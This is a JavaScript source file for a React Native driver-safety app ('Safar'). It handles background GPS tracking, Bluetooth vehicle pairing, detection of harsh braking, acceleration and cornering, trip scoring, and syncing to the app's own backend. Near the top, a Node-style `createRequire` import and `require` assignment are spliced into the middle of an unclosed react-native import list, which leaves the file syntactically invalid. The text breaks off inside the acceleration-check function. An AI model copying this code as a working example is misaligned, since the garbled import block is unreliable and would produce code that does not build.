import AsyncStorage from '@react-native-async-storage/async-storage';
import { createAudioPlayer, setAudioModeAsync } from 'expo-audio';
import Constants from 'expo-constants';
import * as Location from 'expo-location';
import { BleManager } from 'react-native-ble-plx';
import { StatusBar } from 'expo-status-bar';
import { Accelerometer, Gyroscope } from 'expo-sensors';
import * as TaskManager from 'expo-task-manager';
import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import {
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

  ActivityIndicator,
  Alert,
  KeyboardAvoidingView,
  Linking,
  PermissionsAndroid,
  Platform,
  Pressable,
  SafeAreaView,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  Vibration,
  useWindowDimensions,
  View,
} from 'react-native';

const DRIVER_SESSION_KEY = 'safar-driver-session';
const TRACKING_STATUS_KEY = 'safar-tracking-status';
const LAST_TELEMETRY_KEY = 'safar-last-telemetry';
const APP_MODE_KEY = 'safar-app-mode';
const SELF_DRIVE_PROFILE_KEY = 'safar-self-drive-profile';
const SELF_DRIVE_METRICS_KEY = 'safar-self-drive-metrics';
const PAIRED_BLE_DEVICE_KEY = 'safar-paired-ble-device';
const SELF_DRIVE_ACTIVE_TRIP_KEY = 'safar-self-drive-active-trip';
const SELF_DRIVE_TRIP_HISTORY_KEY = 'safar-self-drive-trip-history';
const LOCATION_TASK_NAME = 'safar-driver-background-location';
const LOCATION_UPDATE_INTERVAL_MS = 10000;
const LOCATION_DISTANCE_INTERVAL_METERS = 10;
const API_REQUEST_TIMEOUT_MS = 15000;
const HARSH_BRAKE_THRESHOLD_MS2 = 4.5;
const HARSH_BRAKE_MIN_PREVIOUS_SPEED_KMH = 20;
const HARSH_BRAKE_MIN_TIME_GAP_SECONDS = 1;
const HARSH_BRAKE_MAX_TIME_GAP_SECONDS = 12;
const HARSH_BRAKE_MIN_SPEED_DROP_KMH = 12;
const HARSH_BRAKE_COOLDOWN_MS = 45000;
const HARSH_BRAKE_MAX_GPS_ACCURACY_METERS = 35;
const MAX_TELEMETRY_SAMPLES = 3;
const DEFAULT_DUTY_STATUS = 'off_duty';
const CONTROL_SYNC_INTERVAL_MS = 15000;
const OVERSPEED_DEFAULT_THRESHOLD_KMH = 80;
const OVERSPEED_ALERT_COOLDOWN_MS = 20000;
const APP_MODE_FLEET = 'fleet_driver';
const APP_MODE_SELF = 'self_drive';
const SELF_DRIVE_CAR_DETECTION_SPEED_KMH = 12;
const SELF_DRIVE_BLE_SCAN_COOLDOWN_MS = 30000;
const MOTION_SAMPLE_INTERVAL_MS = 400;
const HARSH_ACCELERATION_THRESHOLD_MS2 = 3.4;
const HARSH_ACCELERATION_MIN_SPEED_GAIN_KMH = 12;
const HARSH_ACCELERATION_MIN_CURRENT_SPEED_KMH = 18;
const HARSH_ACCELERATION_COOLDOWN_MS = 30000;
const SHARP_CORNERING_MIN_SPEED_KMH = 25;
const SHARP_CORNERING_HEADING_DELTA_DEGREES = 35;
const SHARP_CORNERING_GYRO_THRESHOLD_RAD_S = 1.1;
const SHARP_CORNERING_COOLDOWN_MS = 30000;
const DEVICE_DISTURBANCE_ACCEL_DELTA_MS2 = 12;
const DEVICE_DISTURBANCE_GYRO_RAD_S = 3;
const DEVICE_DISTURBANCE_WINDOW_MS = 8000;
const SELF_DRIVE_TRIP_START_SPEED_KMH = 8;
const SELF_DRIVE_TRIP_IDLE_STOP_MS = 120000;
const SELF_DRIVE_HISTORY_LIMIT = 30;

const overspeedAlertPlayer = createAudioPlayer(require('./assets/overspeed-alert.wav'));
let latestMotionSnapshot = {
  timestamp: 0,
  accelerationDeltaMs2: 0,
  gyroMagnitudeRadS: 0,
  isDeviceDisturbance: false,
  disturbanceReason: null,
};

const DEFAULT_PRODUCTION_API_BASE_URL =
  Constants.expoConfig?.extra?.productionApiBaseUrl || 'https://safar-admin.vercel.app';

const API_BASE_URL = __DEV__
  ? Platform.OS === 'android'
    ? 'http://10.0.2.2:3000'
    : 'http://localhost:3000'
  : DEFAULT_PRODUCTION_API_BASE_URL;

function buildApiUrl(path) {
  return API_BASE_URL + path;
}

function formatTimestamp(value) {
  if (!value) {
    return 'Not sent yet';
  }

  try {
    return new Date(value).toLocaleString();
  } catch {
    return value;
  }
}

async function apiRequest(path, options = {}) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), API_REQUEST_TIMEOUT_MS);

  try {
    return await fetch(buildApiUrl(path), {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...(options.headers || {}),
      },
      signal: controller.signal,
    });
  } catch (error) {
    if (error?.name === 'AbortError') {
      throw new Error('Request timed out. Please check your internet connection and try again.');
    }

    throw new Error('Could not connect to Safar services. Please check your internet connection and try again.');
  } finally {
    clearTimeout(timeoutId);
  }
}

async function syncSelfDriveProfileToCloud({ profile, pairedBleDevice = null, latestMetrics = null, clearBleDevice = false }) {
  const response = await apiRequest('/api/self-drive/profile', {
    method: 'POST',
    body: JSON.stringify({
      driverName: profile?.driverName,
      phone: profile?.phone,
      vehicleModel: profile?.vehicleModel,
      vehiclePlate: profile?.vehiclePlate,
      pairedBleDevice,
      latestMetrics,
      clearBleDevice,
    }),
  });
  const json = await response.json();

  if (!response.ok || !json?.success) {
    throw new Error(json?.error || 'Could not sync self-drive profile.');
  }

  return json.data;
}

async function syncSelfDriveTripToCloud({ profileId, trip, latestMetrics = null, pairedBleDevice = null }) {
  const response = await apiRequest('/api/self-drive/trips', {
    method: 'POST',
    body: JSON.stringify({
      profileId,
      trip,
      latestMetrics,
      pairedBleDevice,
    }),
  });
  const json = await response.json();

  if (!response.ok || !json?.success) {
    throw new Error(json?.error || 'Could not sync self-drive trip.');
  }

  return json.data;
}

async function fetchSelfDriveCloudReport({ profileId, range = '30D' }) {
  const response = await apiRequest(
    `/api/self-drive/reports?profileId=${encodeURIComponent(profileId)}&range=${encodeURIComponent(range)}`
  );
  const json = await response.json();

  if (!response.ok || !json?.success) {
    throw new Error(json?.error || 'Could not load self-drive cloud report.');
  }

  return json.data;
}

function buildSelfDriveReportExportUrl({ profileId, range = '30D' }) {
  return buildApiUrl(
    `/api/self-drive/reports/export?profileId=${encodeURIComponent(profileId)}&range=${encodeURIComponent(range)}`
  );
}

function readNumericValue(value) {
  return typeof value === 'number' && Number.isFinite(value) ? value : null;
}

function getLocationTimestamp(location) {
  const timestamp = readNumericValue(location?.timestamp);
  return timestamp && timestamp > 0 ? timestamp : Date.now();
}

function getValidSpeedMps(coords) {
  const speed = readNumericValue(coords?.speed);
  return speed !== null && speed >= 0 ? speed : null;
}

function roundToSingleDecimal(value) {
  return Number(value.toFixed(1));
}

function roundToTwoDecimals(value) {
  return Number(value.toFixed(2));
}

function normalizeHeadingDeltaDegrees(currentHeading, previousHeading) {
  if (!Number.isFinite(currentHeading) || !Number.isFinite(previousHeading)) {
    return null;
  }

  const rawDelta = Math.abs(currentHeading - previousHeading) % 360;
  return rawDelta > 180 ? 360 - rawDelta : rawDelta;
}

function readMotionSnapshot() {
  return latestMotionSnapshot;
}

function updateMotionSnapshot(nextSnapshot) {
  latestMotionSnapshot = {
    ...latestMotionSnapshot,
    ...nextSnapshot,
  };
}

function generateSessionId() {
  return `duty_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

function isTrackingCommandEnabled(trackingState) {
  return trackingState?.trackingExpected === true && trackingState?.dutyStatus === 'on_duty';
}

function getDefaultSelfDriveMetrics() {
  return {
    score: 0,
    totalTrips: 0,
    totalDistanceKm: 0,
    topSpeedKmh: 0,
    currentSpeedKmh: 0,
    overspeedCount: 0,
    harshBrakingCount: 0,
    harshAccelerationCount: 0,
    sharpCorneringCount: 0,
    bluetoothStatus: 'Pair vehicle',
    confidence: 'Low',
    vehiclePresenceStatus: 'Waiting for movement',
    scoreTrend: [0, 0, 0, 0, 0, 0, 0],
    weeklyDistance: [0, 0, 0, 0, 0, 0, 0],
    recentTrips: [],
  };
}

function normalizeSelfDriveMetrics(value) {
  return {
    ...getDefaultSelfDriveMetrics(),
    ...(value || {}),
  };
}

function normalizeSelfDriveProfile(value) {
  if (!value) {
    return null;
  }

  return {
    id: value.id || null,
    driverName: value.driverName || '',
    phone: value.phone || '',
    vehicleModel: value.vehicleModel || '',
    vehiclePlate: value.vehiclePlate || '',
    joinedAt: value.joinedAt || new Date().toISOString(),
    lastSyncedAt: value.lastSyncedAt || null,
  };
}

async function saveAppMode(mode) {
  await AsyncStorage.setItem(APP_MODE_KEY, mode);
}

function normalizeBleDevice(value) {
  if (!value?.id) {
    return null;
  }

  return {
    id: value.id,
    name: value.name || value.localName || 'Unnamed BLE Device',
    localName: value.localName || null,
    rssi: readNumericValue(value.rssi),
    lastSeenAt: value.lastSeenAt || null,
  };
}

function getSelfDriveVehiclePresenceStatus({
  speedKmh,
  pairedBleDevice,
  trustedVehicleNearby = false,
}) {
  const safeSpeedKmh = readNumericValue(speedKmh) || 0;

  if (safeSpeedKmh >= SELF_DRIVE_CAR_DETECTION_SPEED_KMH && trustedVehicleNearby && pairedBleDevice) {
    return `In car detected. Trusted vehicle confirmed: ${pairedBleDevice.name}.`;
  }

  if (safeSpeedKmh >= SELF_DRIVE_CAR_DETECTION_SPEED_KMH && pairedBleDevice) {
    return `Driving detected above ${SELF_DRIVE_CAR_DETECTION_SPEED_KMH} km/h. Verifying trusted vehicle Bluetooth.`;
  }

  if (safeSpeedKmh >= SELF_DRIVE_CAR_DETECTION_SPEED_KMH) {
    return `Driving detected above ${SELF_DRIVE_CAR_DETECTION_SPEED_KMH} km/h. Pair your car Bluetooth to confirm the same vehicle.`;
  }

  if (trustedVehicleNearby && pairedBleDevice) {
    return `Trusted vehicle nearby: ${pairedBleDevice.name}.`;
  }

  return 'Waiting for movement';
}

function toRadians(value) {
  return (value * Math.PI) / 180;
}

function calculateDistanceKm(fromCoords, toCoords) {
  if (!fromCoords || !toCoords) {
    return 0;
  }

  const lat1 = readNumericValue(fromCoords.lat);
  const lng1 = readNumericValue(fromCoords.lng);
  const lat2 = readNumericValue(toCoords.lat);
  const lng2 = readNumericValue(toCoords.lng);

  if (lat1 === null || lng1 === null || lat2 === null || lng2 === null) {
    return 0;
  }

  const earthRadiusKm = 6371;
  const dLat = toRadians(lat2 - lat1);
  const dLng = toRadians(lng2 - lng1);
  const a =
    (Math.sin(dLat / 2) ** 2) +
    Math.cos(toRadians(lat1)) * Math.cos(toRadians(lat2)) * (Math.sin(dLng / 2) ** 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));

  return earthRadiusKm * c;
}

function buildSelfDriveTripLabel(startedAt) {
  try {
    return new Date(startedAt).toLocaleString('en-IN', {
      day: '2-digit',
      month: 'short',
      hour: '2-digit',
      minute: '2-digit',
    });
  } catch {
    return 'Recent Drive';
  }
}

function getDefaultTripHistory() {
  return [];
}

function getDefaultActiveTrip() {
  return null;
}

function normalizeTripHistory(value) {
  return Array.isArray(value) ? value : getDefaultTripHistory();
}

function computeTripScore(events = [], topSpeedKmh = 0) {
  let score = 100;

  for (const event of events) {
    if (event.type === 'overspeed') {
      score -= 12;
    } else if (event.type === 'harsh_braking') {
      score -= 10;
    } else if (event.type === 'harsh_acceleration') {
      score -= 8;
    } else if (event.type === 'sharp_cornering') {
      score -= 8;
    } else if (event.type === 'device_disturbance') {
      score -= 2;
    }
  }

  if (topSpeedKmh >= 100) {
    score -= 4;
  }

  return Math.max(0, score);
}

function summarizeTripHistory(history = [], currentBluetoothStatus = 'Pair vehicle', currentConfidence = 'Low') {
  const normalizedHistory = normalizeTripHistory(history);
  const totalTrips = normalizedHistory.length;
  const totalDistanceKm = normalizedHistory.reduce((sum, trip) => sum + (readNumericValue(trip.distanceKm) || 0), 0);
  const topSpeedKmh = normalizedHistory.reduce((max, trip) => Math.max(max, readNumericValue(trip.topSpeedKmh) || 0), 0);
  const overspeedCount = normalizedHistory.reduce((sum, trip) => sum + (trip.eventCounts?.overspeed || 0), 0);
  const harshBrakingCount = normalizedHistory.reduce((sum, trip) => sum + (trip.eventCounts?.harsh_braking || 0), 0);
  const harshAccelerationCount = normalizedHistory.reduce((sum, trip) => sum + (trip.eventCounts?.harsh_acceleration || 0), 0);
  const sharpCorneringCount = normalizedHistory.reduce((sum, trip) => sum + (trip.eventCounts?.sharp_cornering || 0), 0);
  const scoreTrend = normalizedHistory.slice(0, 7).map((trip) => trip.score).reverse();
  const weeklyDistance = normalizedHistory.slice(0, 7).map((trip) => roundToSingleDecimal(trip.distanceKm || 0)).reverse();
  const averageScore = totalTrips
    ? Math.round(normalizedHistory.reduce((sum, trip) => sum + (trip.score || 0), 0) / totalTrips)
    : getDefaultSelfDriveMetrics().score;

  return normalizeSelfDriveMetrics({
    score: averageScore,
    totalTrips,
    totalDistanceKm: roundToSingleDecimal(totalDistanceKm || 0),
    topSpeedKmh: roundToSingleDecimal(topSpeedKmh || 0),
    currentSpeedKmh: 0,
    overspeedCount,
    harshBrakingCount,
    harshAccelerationCount,
    sharpCorneringCount,
    bluetoothStatus: currentBluetoothStatus,
    confidence: currentConfidence,
    vehiclePresenceStatus: getDefaultSelfDriveMetrics().vehiclePresenceStatus,
    scoreTrend: scoreTrend.length ? scoreTrend : getDefaultSelfDriveMetrics().scoreTrend,
    weeklyDistance: weeklyDistance.length ? weeklyDistance : getDefaultSelfDriveMetrics().weeklyDistance,
    recentTrips: normalizedHistory.slice(0, 5).map((trip) => ({
      id: trip.id,
      label: trip.label,
      score: trip.score,
      distanceKm: roundToSingleDecimal(trip.distanceKm || 0),
      topSpeedKmh: roundToSingleDecimal(trip.topSpeedKmh || 0),
    })),
  });
}

function getReportRangeDays(range) {
  if (range === '7D') {
    return 7;
  }
  if (range === '60D') {
    return 60;
  }
  if (range === '90D') {
    return 90;
  }
  return 30;
}

function filterTripHistoryByRange(history = [], range = '30D') {
  const days = getReportRangeDays(range);
  const threshold = Date.now() - (days * 24 * 60 * 60 * 1000);
  return normalizeTripHistory(history).filter((trip) => {
    const tripTime = trip?.endedAt || trip?.startedAt;
    const timestamp = tripTime ? new Date(tripTime).getTime() : 0;
    return Number.isFinite(timestamp) && timestamp >= threshold;
  });
}

function getScoreBand(score) {
  if (score >= 90) {
    return 'Excellent';
  }
  if (score >= 80) {
    return 'Strong';
  }
  if (score >= 70) {
    return 'Watchlist';
  }
  return 'High Risk';
}

function buildCoachingInsights(metrics, history = []) {
  const insights = [];
  const normalizedHistory = normalizeTripHistory(history);

  if (!normalizedHistory.length) {
    insights.push('Start 1-2 short drives to unlock your personal trend and trip coaching.');
  }

  if (metrics.overspeedCount > 0) {
    insights.push(`Keep highway pace controlled. ${metrics.overspeedCount} overspeed events are hurting the score.`);
  }

  if (metrics.harshBrakingCount > metrics.harshAccelerationCount) {
    insights.push('Maintain more braking distance. Sudden brake events are higher than acceleration events.');
  }

  if (metrics.sharpCorneringCount >= 2) {
    insights.push('Reduce aggressive lane changes and fast turns to improve stability confidence.');
  }

  if (metrics.confidence === 'Low') {
    insights.push('Pair the trusted vehicle and keep the phone stable in a holder for better trip confidence.');
  }

  if (!insights.length) {
    insights.push('Driving quality is looking stable. Focus on consistency to keep the score above 90.');
  }

  return insights.slice(0, 3);
}

function formatTripDuration(trip) {
  const startedAt = trip?.startedAt ? new Date(trip.startedAt).getTime() : null;
  const endedAt = trip?.endedAt ? new Date(trip.endedAt).getTime() : null;

  if (!startedAt || !endedAt || endedAt <= startedAt) {
    return 'Live session';
  }

  const totalMinutes = Math.max(1, Math.round((endedAt - startedAt) / 60000));
  if (totalMinutes < 60) {
    return `${totalMinutes} min`;
  }

  const hours = Math.floor(totalMinutes / 60);
  const minutes = totalMinutes % 60;
  return minutes ? `${hours}h ${minutes}m` : `${hours}h`;
}

function formatDateTimeLabel(value) {
  if (!value) {
    return 'Not available';
  }

  try {
    return new Date(value).toLocaleString('en-IN', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  } catch {
    return value;
  }
}

function buildReportSnapshot(metrics, trips = [], range = '30D') {
  const latestTrip = trips[0] || null;

  return [
    { label: 'Report window', value: range },
    { label: 'Safety score', value: `${metrics.score}` },
    { label: 'Score band', value: getScoreBand(metrics.score) },
    { label: 'Trips in range', value: `${metrics.totalTrips}` },
    { label: 'Distance covered', value: `${metrics.totalDistanceKm} km` },
    { label: 'Top speed', value: `${metrics.topSpeedKmh} km/h` },
    { label: 'Confidence', value: metrics.confidence },
    { label: 'Latest trip', value: latestTrip ? latestTrip.label : 'No completed trip yet' },
    { label: 'Latest trip time', value: latestTrip ? formatDateTimeLabel(latestTrip.endedAt || latestTrip.startedAt) : 'Not available' },
  ];
}

async function loadSelfDriveTripHistory() {
  try {
    const storedHistory = await AsyncStorage.getItem(SELF_DRIVE_TRIP_HISTORY_KEY);
    return storedHistory ? normalizeTripHistory(JSON.parse(storedHistory)) : getDefaultTripHistory();
  } catch (error) {
    console.error('Failed to restore self-drive trip history:', error);
    return getDefaultTripHistory();
  }
}

async function saveSelfDriveTripHistory(history) {
  await AsyncStorage.setItem(SELF_DRIVE_TRIP_HISTORY_KEY, JSON.stringify(normalizeTripHistory(history)));
}

async function loadSelfDriveActiveTrip() {
  try {
    const storedTrip = await AsyncStorage.getItem(SELF_DRIVE_ACTIVE_TRIP_KEY);
    return storedTrip ? JSON.parse(storedTrip) : getDefaultActiveTrip();
  } catch (error) {
    console.error('Failed to restore active self-drive trip:', error);
    return getDefaultActiveTrip();
  }
}

async function saveSelfDriveActiveTrip(trip) {
  if (!trip) {
    await AsyncStorage.removeItem(SELF_DRIVE_ACTIVE_TRIP_KEY);
    return;
  }

  await AsyncStorage.setItem(SELF_DRIVE_ACTIVE_TRIP_KEY, JSON.stringify(trip));
}

function getDefaultTrackingState() {
  return {
    isTracking: false,
    lastUpdatedAt: null,
    dutyStatus: DEFAULT_DUTY_STATUS,
    trackingExpected: false,
    reason: null,
    sessionId: null,
    overspeedThresholdKmh: OVERSPEED_DEFAULT_THRESHOLD_KMH,
  };
}

function normalizeTrackingState(value) {
  const next = {
    ...getDefaultTrackingState(),
    ...(value || {}),
  };

  next.overspeedThresholdKmh = readNumericValue(next.overspeedThresholdKmh) || OVERSPEED_DEFAULT_THRESHOLD_KMH;
  next.dutyStatus = typeof next.dutyStatus === 'string' ? next.dutyStatus : DEFAULT_DUTY_STATUS;
  next.trackingExpected = next.trackingExpected === true;
  next.reason = typeof next.reason === 'string' && next.reason.trim() ? next.reason : null;
  next.sessionId = typeof next.sessionId === 'string' && next.sessionId.trim() ? next.sessionId : null;

  return {
    ...next,
  };
}

async function fetchDriverControlState(driverId, fleetId) {
  const response = await apiRequest(
    `/api/driver-control?driverId=${encodeURIComponent(driverId)}&fleetId=${encodeURIComponent(fleetId)}`
  );
  const json = await response.json();

  if (!response.ok || !json?.success) {
    throw new Error(json?.error || 'Could not load admin duty control.');
  }

  return json.data;
}

async function playOverspeedAlert(speedKmh, thresholdKmh) {
  try {
    Vibration.vibrate(500);
    await overspeedAlertPlayer.seekTo(0);
    overspeedAlertPlayer.play();
    console.log('[OverspeedAlert] local warning played', {
      speedKmh,
      thresholdKmh,
    });
  } catch (error) {
    console.error('Failed to play overspeed alert:', error);
  }
}

function toSample(location, speedMps, speedKmh) {
  const coords = location?.coords || {};
  const accuracy = readNumericValue(coords.accuracy);

  return {
    timestamp: getLocationTimestamp(location),
    speedMps,
    speedKmh,
    lat: readNumericValue(coords.latitude),
    lng: readNumericValue(coords.longitude),
    heading: readNumericValue(coords.heading),
    accuracy,
  };
}

async function loadTelemetryState() {
  try {
    const storedTelemetry = await AsyncStorage.getItem(LAST_TELEMETRY_KEY);

    if (!storedTelemetry) {
      return {
        samples: [],
        lastHarshBrakingAt: null,
        lastHarshAccelerationAt: null,
        lastSharpCorneringAt: null,
      };
    }

    const parsedTelemetry = JSON.parse(storedTelemetry);
    return {
      samples: Array.isArray(parsedTelemetry?.samples) ? parsedTelemetry.samples : [],
      lastHarshBrakingAt: readNumericValue(parsedTelemetry?.lastHarshBrakingAt),
      lastHarshAccelerationAt: readNumericValue(parsedTelemetry?.lastHarshAccelerationAt),
      lastSharpCorneringAt: readNumericValue(parsedTelemetry?.lastSharpCorneringAt),
    };
  } catch (error) {
    console.error('Failed to restore telemetry state:', error);
    return {
      samples: [],
      lastHarshBrakingAt: null,
      lastHarshAccelerationAt: null,
      lastSharpCorneringAt: null,
    };
  }
}

async function saveTelemetryState(state) {
  await AsyncStorage.setItem(LAST_TELEMETRY_KEY, JSON.stringify(state));
}

async function clearTelemetryState() {
  await AsyncStorage.removeItem(LAST_TELEMETRY_KEY);
}

function isReliableTelemetrySample(sample) {
  return (
    sample &&
    readNumericValue(sample.timestamp) !== null &&
    readNumericValue(sample.speedMps) !== null &&
    readNumericValue(sample.speedKmh) !== null &&
    sample.speedMps >= 0 &&
    sample.speedKmh >= 0 &&
    (sample.accuracy === null || sample.accuracy <= HARSH_BRAKE_MAX_GPS_ACCURACY_METERS)
  );
}

function buildHarshBrakingEvent({ decelerationMs2, previousSpeedKmh, currentSpeedKmh, deltaTimeSeconds }) {
  return {
    type: 'harsh_braking',
    severity: 'high',
    message: 'Driver applied harsh braking.',
    meta: {
      decelerationMs2: roundToSingleDecimal(decelerationMs2),
      previousSpeedKmh: roundToSingleDecimal(previousSpeedKmh),
      currentSpeedKmh: roundToSingleDecimal(currentSpeedKmh),
      deltaTimeSeconds: roundToSingleDecimal(deltaTimeSeconds),
      detectionSource: 'driver_app',
    },
  };
}

function buildHarshAccelerationEvent({ accelerationMs2, previousSpeedKmh, currentSpeedKmh, deltaTimeSeconds }) {
  return {
    type: 'harsh_acceleration',
    severity: 'high',
    message: 'Driver accelerated harshly.',
    meta: {
      accelerationMs2: roundToSingleDecimal(accelerationMs2),
      previousSpeedKmh: roundToSingleDecimal(previousSpeedKmh),
      currentSpeedKmh: roundToSingleDecimal(currentSpeedKmh),
      deltaTimeSeconds: roundToSingleDecimal(deltaTimeSeconds),
      detectionSource: 'driver_app',
    },
  };
}

function buildSharpCorneringEvent({ currentSpeedKmh, headingDeltaDegrees, gyroMagnitudeRadS, deltaTimeSeconds }) {
  return {
    type: 'sharp_cornering',
    severity: 'high',
    message: 'Driver took a sharp corner.',
    meta: {
      currentSpeedKmh: roundToSingleDecimal(currentSpeedKmh),
      headingDeltaDegrees: roundToSingleDecimal(headingDeltaDegrees),
      gyroMagnitudeRadS: roundToTwoDecimals(gyroMagnitudeRadS),
      deltaTimeSeconds: roundToSingleDecimal(deltaTimeSeconds),
      detectionSource: 'driver_app',
    },
  };
}

function buildDeviceDisturbanceEvent({ accelerationDeltaMs2, gyroMagnitudeRadS, reason }) {
  return {
    type: 'device_disturbance',
    severity: 'medium',
    message: 'Phone movement looked unstable and was not counted as a driving event.',
    meta: {
      accelerationDeltaMs2: roundToSingleDecimal(accelerationDeltaMs2),
      gyroMagnitudeRadS: roundToTwoDecimals(gyroMagnitudeRadS),
      reason,
      detectionSource: 'driver_app',
    },
  };
}

function buildOverspeedEvent({ speedKmh, thresholdKmh }) {
  return {
    type: 'overspeed',
    severity: speedKmh >= thresholdKmh + 20 ? 'high' : 'medium',
    message: `Vehicle crossed ${thresholdKmh} km/h speed threshold.`,
    meta: {
      speedKmh: roundToSingleDecimal(speedKmh),
      thresholdKmh: roundToSingleDecimal(thresholdKmh),
      detectionSource: 'driver_app',
    },
  };
}

function evaluateMotionQuality() {
  const motionSnapshot = readMotionSnapshot();
  const snapshotAgeMs = Date.now() - (motionSnapshot.timestamp || 0);
  const isFresh = snapshotAgeMs >= 0 && snapshotAgeMs <= DEVICE_DISTURBANCE_WINDOW_MS;

  return {
    ...motionSnapshot,
    isFresh,
    shouldRejectDrivingEvent:
      isFresh &&
      motionSnapshot.isDeviceDisturbance === true,
  };
}

function evaluateHarshBraking(currentSample, telemetryState, motionQuality) {
  const currentSpeedKmh = readNumericValue(currentSample?.speedKmh);
  const currentSpeedMps = readNumericValue(currentSample?.speedMps);
  const currentTimestamp = readNumericValue(currentSample?.timestamp);

  if (currentSpeedKmh === null || currentSpeedMps === null || currentTimestamp === null) {
    console.log('[HarshBraking] skipped: current sample missing valid speed/timestamp', {
      previousSpeedKmh: null,
      currentSpeedKmh,
      deltaTimeSeconds: null,
      decelerationMs2: null,
    });
    return { event: null, reason: 'invalid_current_sample' };
  }

  const reliableHistory = (telemetryState?.samples || [])
    .filter(isReliableTelemetrySample)
    .sort((left, right) => left.timestamp - right.timestamp);

  const previousSample = [...reliableHistory]
    .reverse()
    .find((sample) => sample.timestamp < currentTimestamp);

  if (!previousSample) {
    console.log('[HarshBraking] skipped: no previous valid sample', {
      previousSpeedKmh: null,
      currentSpeedKmh,
      deltaTimeSeconds: null,
      decelerationMs2: null,
    });
    return { event: null, reason: 'missing_previous_sample' };
  }

  const previousSpeedKmh = readNumericValue(previousSample.speedKmh);
  const previousSpeedMps = readNumericValue(previousSample.speedMps);
  const deltaTimeSeconds = (currentTimestamp - previousSample.timestamp) / 1000;
  const speedDropKmh = previousSpeedKmh - currentSpeedKmh;
  const decelerationMs2 = (previousSpeedMps - currentSpeedMps) / deltaTimeSeconds;
  const cooldownRemainingMs =
    telemetryState?.lastHarshBrakingAt && currentTimestamp > telemetryState.lastHarshBrakingAt
      ? HARSH_BRAKE_COOLDOWN_MS - (currentTimestamp - telemetryState.lastHarshBrakingAt)
      : null;

  let skipReason = null;

  if (motionQuality?.shouldRejectDrivingEvent) {
    skipReason = motionQuality.disturbanceReason || 'device_disturbance_detected';
  } else if (currentSample.accuracy !== null && currentSample.accuracy > HARSH_BRAKE_MAX_GPS_ACCURACY_METERS) {
    skipReason = 'poor_current_gps_accuracy';
  } else if (
    previousSample.accuracy !== null &&
    previousSample.accuracy > HARSH_BRAKE_MAX_GPS_ACCURACY_METERS
  ) {
    skipReason = 'poor_previous_gps_accuracy';
  } else if (previousSpeedKmh < HARSH_BRAKE_MIN_PREVIOUS_SPEED_KMH) {
    skipReason = 'previous_speed_below_minimum';
  } else if (currentSpeedKmh < 5) {
    skipReason = 'current_speed_too_low';
  } else if (deltaTimeSeconds < HARSH_BRAKE_MIN_TIME_GAP_SECONDS) {
    skipReason = 'delta_time_too_short';
  } else if (deltaTimeSeconds > HARSH_BRAKE_MAX_TIME_GAP_SECONDS) {
    skipReason = 'delta_time_too_long';
  } else if (speedDropKmh < HARSH_BRAKE_MIN_SPEED_DROP_KMH) {
    skipReason = 'speed_drop_not_meaningful';
  } else if (!Number.isFinite(decelerationMs2) || decelerationMs2 <= 0) {
    skipReason = 'deceleration_not_valid';
  } else if (decelerationMs2 < HARSH_BRAKE_THRESHOLD_MS2) {
    skipReason = 'below_threshold';
  } else if (cooldownRemainingMs !== null && cooldownRemainingMs > 0) {
    skipReason = 'cooldown_active';
  } else if (reliableHistory.length >= 2) {
    const secondPreviousSample = reliableHistory[reliableHistory.length - 2];
    const olderSpeedKmh = readNumericValue(secondPreviousSample?.speedKmh);

    if (olderSpeedKmh !== null && previousSpeedKmh > olderSpeedKmh) {
      skipReason = 'speed_not_stably_decreasing';
    }
  }

  console.log('[HarshBraking] telemetry check', {
    previousSpeedKmh: previousSpeedKmh !== null ? roundToSingleDecimal(previousSpeedKmh) : null,
    currentSpeedKmh: currentSpeedKmh !== null ? roundToSingleDecimal(currentSpeedKmh) : null,
    deltaTimeSeconds: Number.isFinite(deltaTimeSeconds) ? roundToSingleDecimal(deltaTimeSeconds) : null,
    decelerationMs2: Number.isFinite(decelerationMs2) ? roundToSingleDecimal(decelerationMs2) : null,
    result: skipReason ? 'skipped' : 'triggered',
    reason: skipReason || 'threshold_crossed',
  });

  if (skipReason) {
    return { event: null, reason: skipReason };
  }

  return {
    event: buildHarshBrakingEvent({
      decelerationMs2,
      previousSpeedKmh,
      currentSpeedKmh,
      deltaTimeSeconds,
    }),
    reason: 'triggered',
  };
}

function evaluateHarshAcceleration(currentSample, telemetryState, motionQuality) {
  const currentSpeedKmh = readNumericValue(currentSample?.speedKmh);
  const currentSpeedMps = readNumericValue(currentSample?.speedMps);
  const currentTimestamp = readNumericValue(currentSample?.timestamp);

  if (currentSpeedKmh === null || currentSpeedMps === null || currentTimestamp === null) {
    return { event: null, reason: 'invalid_current_sample' };
  }

  const reliableHistory = (telemetryState?.samples || [])
    .filter(isReliableTelemetrySample)
    .sort((left, right) => left.timestamp - right.timestamp);
  const previousSample = [...reliableHistory]
    .reverse()
    .find((sample) => sample.timestamp < currentTimestamp);

  if (!previousSample) {
    return { event: null, reason: 'missing_previous_sample' };
  }

  const previousSpeedKmh = readNumericValue(previousSample.speedKmh);
  const previousSpeedMps = readNumericValue(previousSample.speedMps);
  const deltaTimeSeconds = (currentTimestamp - previousSample.timestamp) / 1000;
  const speedGainKmh = currentSpeedKmh - previousSpeedKmh;
  const accelerationMs2 = (currentSpeedMps - previousSpeedMps) / deltaTimeSeconds;
  const cooldownRemainingMs =
    telemetryState?.lastHarshAccelerationAt && currentTimestamp > telemetryState.lastHarshAccelerationAt
      ? HARSH_ACCELERATION_COOLDOWN_MS - (currentTimestamp - telemetryState.lastHarshAccelerationAt)
      : null;

  let skipReason = null;

  if (motionQuality?.shouldRejectDrivingEvent) {
    skipReason = motionQuality.disturbanceReason || 'device_disturbance_detected';
  } else if (currentSample.accuracy !== null && currentSample.accuracy > HARSH_BRAKE_MAX_GPS_ACCURACY_METERS) {
    skipReason = 'poor_current_gps_accuracy';
  } else if (previousSample.accuracy !== null && previousSample.accuracy > HARSH_BRAKE_MAX_GPS_ACCURACY_METERS) {
    skipReason = 'poor_previous_gps_accuracy';
  } else if (currentSpeedKmh < HARSH_ACCELERATION_MIN_CURRENT_SPEED_KMH) {
    skipReason = 'current_speed_below_minimum';
